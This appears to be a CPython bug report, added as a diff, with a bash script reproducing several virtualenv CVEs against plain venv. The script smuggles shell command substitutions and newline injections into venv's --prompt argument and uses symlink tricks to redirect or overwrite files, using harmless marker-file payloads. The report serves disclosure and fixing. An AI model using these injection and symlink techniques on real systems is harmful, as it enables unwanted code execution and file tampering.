@@ -1,0 +1,90 @@
+### Bug report
+
+In Fedora, we have recently triaged some CVE that were publicly displosed for pypa/virtualenv. I decided to check if anything is also reproducible via plain venv and it is.
+
+CVE-2026-113723, CVE-2026-113725, CVE-2026-113726, CVE-2026-113732, CVE-2026-113715, CVE-2026-113716, CVE-2026-113721
+
+Neither is considered a security vulnerability in CPython:
+
+> Vulnerabilities must not depend on malicious control of Python’s launch conditions, including (but not limited to) command line arguments, environment variables, or modifications to files on the target system. We assume that, at the time Python is executed, the environment is as intended by the legitimate user, and any malicious variation from this cannot be mitigated by Python itself.
+
+However, those issues are still nice to fix.
+
+To reproduce:
+
+```bash
+#!/bin/bash
+set -u
+for PY in python3.14 python3.15 python3.16; do
+  echo "################## $PY ##################"
+  WORK=$(mktemp -d)
+  cd "$WORK"
+
+  echo "=== 1. bash/zsh PS1 redraw injection ==="
+  echo "    cf. virtualenv CVE-2026-113723, CVE-2026-113725, CVE-2026-113726"
+  "$PY" -m venv --without-pip --prompt "x\$(touch $WORK/PWNED_BASH)y" "$WORK/venv1" >/dev/null 2>&1
+  bash -c "source $WORK/venv1/bin/activate; echo \"\${PS1@P}\"" >/dev/null 2>&1
+  test -e "$WORK/PWNED_BASH" && echo "BASH: VULNERABLE" || echo "BASH: not reproduced"
+
+  "$PY" -m venv --without-pip --prompt "x\$(touch $WORK/PWNED_ZSH)y" "$WORK/venv1z" >/dev/null 2>&1
+  zsh -c "setopt PROMPT_SUBST; source $WORK/venv1z/bin/activate; print -P \"\$PS1\"" >/dev/null 2>&1
+  test -e "$WORK/PWNED_ZSH" && echo "ZSH: VULNERABLE" || echo "ZSH: not reproduced"
+
+  echo "=== 2. fish quote-escaping gap ==="
+  echo "    cf. virtualenv CVE-2026-113732"
+  mkdir -p "$WORK/workdir2"
+  "$PY" -m venv --without-pip --prompt "x\\'\$(touch PWNED)'\\'" "$WORK/venv2" >/dev/null 2>&1
+  (cd "$WORK/workdir2" && fish --no-config -c "source $WORK/venv2/bin/activate.fish" >/dev/null 2>&1)
+  test -e "$WORK/workdir2/PWNED" && echo "FISH: VULNERABLE" || echo "FISH: not reproduced"
+
+  echo "=== 3. pyvenv.cfg injection via command= ==="
+  echo "    cf. virtualenv CVE-2026-113715"
+  "$PY" -m venv --without-pip --prompt $'legit\ninclude-system-site-packages = true\n#' "$WORK/venv3" >/dev/null 2>&1
+  RESULT=$("$WORK/venv3/bin/$PY" -c "import site; print(site.ENABLE_USER_SITE)" 2>&1)
+  echo "ENABLE_USER_SITE=$RESULT"
+
+  echo "=== 4. site-packages redirected via symlinked intermediate dir ==="
+  echo "    cf. virtualenv CVE-2026-113716"
+  mkdir -p "$WORK/envdir4" "$WORK/outside4"
+  ln -s "$WORK/outside4" "$WORK/envdir4/lib"
+  "$PY" -m venv --without-pip "$WORK/envdir4" >/dev/null 2>&1
+  test -d "$WORK/outside4/$PY/site-packages" && echo "SYMLINK-DIR: VULNERABLE" || echo "SYMLINK-DIR: not reproduced"
+
+  echo "=== 5. file overwrite through pre-existing symlink ==="
+  echo "    cf. virtualenv CVE-2026-113721"
+  mkdir -p "$WORK/envdir5/bin"
+  echo SENSITIVE > "$WORK/outside5"
+  ln -s "$WORK/outside5" "$WORK/envdir5/bin/activate"
+  "$PY" -m venv --without-pip "$WORK/envdir5" >/dev/null 2>&1
+  grep -q "virtualenv\|venv" "$WORK/outside5" 2>/dev/null && echo "SYMLINK-FILE: VULNERABLE" || echo "SYMLINK-FILE: not reproduced"
+
+  rm -rf "$WORK"
+  echo
+done
+```
+
+virtualenv fixes:
+
+- https://github.com/pypa/virtualenv/commit/5f48d711731311428aebfae61d46957762155b22
+- https://github.com/pypa/virtualenv/commit/c3104e02474b652832a9bbaae79f6e1696296932
+- https://github.com/pypa/virtualenv/commit/5b915367da82bd024b2a0d28d2f98007034b4aa2
+- https://github.com/pypa/virtualenv/commit/3bddeaf8d02c3ee7f576503efb082f8f494cfcab
+- https://github.com/pypa/virtualenv/commit/b0008a58885ded9227faf8f910c6c402712c750a
+- https://github.com/pypa/virtualenv/commit/554d9f9d4f7758f5cf53f993031e29787f1f74c5
+- https://github.com/pypa/virtualenv/commit/d25f28699eefb1fc34a251e5adf2b5de844c36cd
+
+### CPython versions tested on:
+
+3.16, 3.15, 3.14
+
+### Operating systems tested on:
+
+Linux
+
+<!-- gh-linked-prs -->
+### Linked PRs
+* gh-160943
+* gh-160971
+* gh-160972
+* gh-160973
+<!-- /gh-linked-prs -->
